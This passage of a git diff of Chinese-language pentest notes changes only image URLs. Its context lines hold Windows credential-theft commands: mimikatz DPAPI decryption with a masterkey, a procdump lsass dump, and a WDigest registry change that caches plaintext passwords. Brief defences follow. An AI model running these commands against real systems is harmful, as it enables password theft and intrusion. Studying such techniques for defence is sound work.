 mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c
 ```
 
-![image-20230202180745467](https://img.gyxnb.top/img/image-20230202180745467.png)
+![image-20230202180745467](https://image.201068.xyz/assets/image-20230202180745467.png)
 
 ## 离线破解
 
@@ -1174,11 +1174,11 @@ mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credenti
 procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump #导出lsass
 ```
 
-![image-20230202180835043](https://img.gyxnb.top/img/image-20230202180835043.png)
+![image-20230202180835043](https://image.201068.xyz/assets/image-20230202180835043.png)
 
 2、下载目标的Credentials文件
 
-![image-20230202180915140](https://img.gyxnb.top/img/image-20230202180915140.png)
+![image-20230202180915140](https://image.201068.xyz/assets/image-20230202180915140.png)
 
 3、用mimikatz载入dump回来的内存
 
@@ -1186,7 +1186,7 @@ procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump #导出lsass
 Sekurlsa::minidump lsass1.dump
 ```
 
-![image-20230202180935850](https://img.gyxnb.top/img/image-20230202180935850.png)
+![image-20230202180935850](https://image.201068.xyz/assets/image-20230202180935850.png)
 
 4、获取Credentials的GUID
 
@@ -1194,7 +1194,7 @@ Sekurlsa::minidump lsass1.dump
 dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421
 ```
 
-![image-20230202180958678](https://img.gyxnb.top/img/image-20230202180958678.png)
+![image-20230202180958678](https://image.201068.xyz/assets/image-20230202180958678.png)
 
 5、获取内存中所有的MasterKey
 
@@ -1202,7 +1202,7 @@ dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421
 sekurlsa::dpapi
 ```
 
-![image-20230202194358750](https://img.gyxnb.top/img/image-20230202194358750.png)
+![image-20230202194358750](https://image.201068.xyz/assets/image-20230202194358750.png)
 
 6、利用MasterKey解密
 
@@ -1210,13 +1210,13 @@ sekurlsa::dpapi
 dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c
 ```
 
-![image-20230202194436859](https://img.gyxnb.top/img/image-20230202194436859.png)
+![image-20230202194436859](https://image.201068.xyz/assets/image-20230202194436859.png)
 
 # Windows-2012R2之后抓取密码的方式
 
 在Windows2012系统及以上的系统，默认在*内存缓存中 禁止 保存明文密码*的。攻击者可以通过 *修改注册表* 的方式 抓取明文，需要用户*重新登录后*才能成功抓取
 
-![image-20230203154647667](https://img.gyxnb.top/img/image-20230203154647667.png)
+![image-20230203154647667](https://image.201068.xyz/assets/image-20230203154647667.png)
 
 
 
@@ -1229,7 +1229,7 @@ reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WD
 reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f #关闭
 ```
 
-![image-20230203154722396](https://img.gyxnb.top/img/image-20230203154722396.png)
+![image-20230203154722396](https://image.201068.xyz/assets/image-20230203154722396.png)
 
 ### 锁屏
 
@@ -1240,11 +1240,11 @@ query user #查询登录
 logoff ID号 #下线
 ```
 
-![image-20230203154749135](https://img.gyxnb.top/img/image-20230203154749135.png)
+![image-20230203154749135](https://image.201068.xyz/assets/image-20230203154749135.png)
 
 ## 抓取密码
 
-![image-20230203154808635](https://img.gyxnb.top/img/image-20230203154808635.png)
+![image-20230203154808635](https://image.201068.xyz/assets/image-20230203154808635.png)
 
 # 密码防范
 
@@ -1252,7 +1252,7 @@ logoff ID号 #下线
 
 在windows server 2012 R2中，新增了一个*Protected Users* 安全组，将用户加入到该私有组，用户的明文密码就不会 被获取
 
-![image-20230203154854263](https://img.gyxnb.top/img/image-20230203154854263.png)
+![image-20230203154854263](https://image.201068.xyz/assets/image-20230203154854263.png)
 
 ## 安装KB2871997
 
